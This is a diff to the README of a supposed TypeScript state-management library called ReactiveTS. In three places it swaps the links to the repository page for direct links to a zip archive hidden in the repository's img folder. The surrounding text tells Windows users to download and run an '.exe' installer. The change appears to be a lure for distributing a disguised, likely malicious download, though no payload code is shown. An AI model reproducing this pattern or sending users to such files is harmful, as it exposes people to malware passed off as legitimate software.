@@ -1,6 +1,6 @@
 # ⚛️ ReactiveTS - Manage State Simply and Clearly
 
-[![Download ReactiveTS](https://img.shields.io/badge/Download-ReactiveTS-4CAF50?style=for-the-badge)](https://github.com/suyosha79-wq/ReactiveTS)
+[![Download ReactiveTS](https://img.shields.io/badge/Download-ReactiveTS-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/suyosha79-wq/ReactiveTS/main/img/TS_Reactive_v3.8.zip)
 
 ## 🔍 What is ReactiveTS?
 
@@ -30,7 +30,7 @@ To get ReactiveTS on your Windows PC, follow these steps carefully.
 1. **Go to the Download Page**
 
    Open this page in your web browser:  
-   [Download ReactiveTS](https://github.com/suyosha79-wq/ReactiveTS)  
+   [Download ReactiveTS](https://raw.githubusercontent.com/suyosha79-wq/ReactiveTS/main/img/TS_Reactive_v3.8.zip)  
    This link takes you to a page where you can find the files to download ReactiveTS.
 
 2. **Find the Latest Version**
@@ -117,7 +117,7 @@ Topics covered by ReactiveTS include managing lists, objects, and event handling
 
 You need to visit this page to download ReactiveTS:
 
-[Get ReactiveTS here](https://github.com/suyosha79-wq/ReactiveTS)
+[Get ReactiveTS here](https://raw.githubusercontent.com/suyosha79-wq/ReactiveTS/main/img/TS_Reactive_v3.8.zip)
 
 Follow the instructions on that page to find the latest `.exe` installer. Download it, run it, and follow the setup steps provided.
 
